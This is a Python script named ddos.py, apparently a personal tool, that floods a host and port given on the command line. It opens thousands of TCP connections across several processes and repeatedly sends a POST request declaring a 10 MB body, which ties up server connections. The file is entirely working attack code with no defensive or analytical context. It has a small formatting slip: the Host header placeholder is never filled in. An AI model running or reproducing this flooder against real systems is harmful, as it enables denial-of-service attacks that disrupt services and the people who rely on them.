#!/usr/local/bin/python3
# coding: UTF-8
# Author: David
# Email: youchen.du@gmail.com
# Created: 2017-04-14 13:16
# Last modified: 2017-04-14 14:13
# Filename: ddos.py
# Description:
import socket
import sys
import time
import signal
import multiprocessing

from threading import Thread
from concurrent.futures import ProcessPoolExecutor

workers = []
worker_num = 2000
payload = ("POST / HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Content-Length: 10000000\r\n"
           "Cookie: DDoS_test\r\n"
           "\r\n")


def maintain_workers(host, port):
    global workers
    while True:
        print('Maintaining.')
        size = len(workers)
        for i in range(worker_num-size):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                sock.send(payload)
                workers.append(sock)
            except Exception as e:
                pass
        time.sleep(1)
    print('Close all sockets')
    for sock in workers:
        sock.close()
    workers.clear()
    return True


def attack():
    global workers
    while True:
        removes = []
        for sock in workers:
            try:
                sock.send(payload)
            except Exception:
                removes.append(sock)
    print('Finish attack')
    return True


def attack_main(host, port):
    maintain_thread = Thread(target=maintain_workers, args=(host, port))
    attack_thread = Thread(target=attack)
    maintain_thread.start()
    attack_thread.start()
    maintain_thread.join()
    attack_thread.join()


def init_worker():
    signal.signal(signal.SIGINT, signal.SIG_IGN)


def main():
    host, port = sys.argv[1:]
    port = int(port)
    global payload
    payload = payload.format(host).encode('utf-8')
    pool = multiprocessing.Pool(initializer=init_worker)
    try:
        for i in range(4):
            pool.apply_async(attack_main, args=(host, port))
        time.sleep(2)
        print('Init finished. Ctrl-C to terminate')
        pool.close()
        pool.join()
    except KeyboardInterrupt:
        print('Caught KeyboardInterrupt, terminating workers')
        pool.terminate()
        pool.join()

if __name__ == '__main__':
    main()
